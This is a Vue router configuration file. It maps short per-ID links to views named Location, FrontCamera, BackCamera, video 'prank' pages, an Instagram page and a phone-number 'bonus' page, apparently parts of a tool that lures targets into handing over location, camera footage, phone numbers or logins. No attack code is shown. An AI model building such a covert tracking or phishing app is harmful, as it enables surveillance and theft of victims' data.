import {createRouter, createWebHistory} from 'vue-router'
import Location from "@/views/Location.vue";
import FrontCamera from "@/views/FrontCamera.vue";
import BackCamera from "@/views/BackCamera.vue";
import Instagram from "@/views/instagram.vue";
import Prank from "@/views/Prank.vue";
import BonusForPhoneNumber from "@/views/BonusForPhoneNumber.vue";
import FronCamVideo from "@/views/FronCamVideo.vue";
import BackCamVideo from "@/views/BackCamVideo.vue";


const routes = [
    {
        path: '/lk/:id',
        name: 'Location',
        component: Location
    }, {
        path: '/ph/:id',
        name: 'FrontCam',
        component: FrontCamera

    }, {
        path: '/bc/:id',
        name: 'BackCam',
        component: BackCamera
    }, {
        path: '/instagram',
        name: 'Instagram',
        component: Instagram
    }, {
        path: '/prank/:id',
        name: 'Prank',
        component: Prank
    }, {
        path: '/bonus/:id',
        name: 'bonus',
        component: BonusForPhoneNumber
    }, {
        path: '/video-prank/:id',
        name: 'video-prank',
        component: FronCamVideo
    }, {
        path: '/video-prank2/:id',
        name: 'video-prank',
        component: BackCamVideo
    }

]

const router = createRouter({
    history: createWebHistory(),
    routes
})

export default router
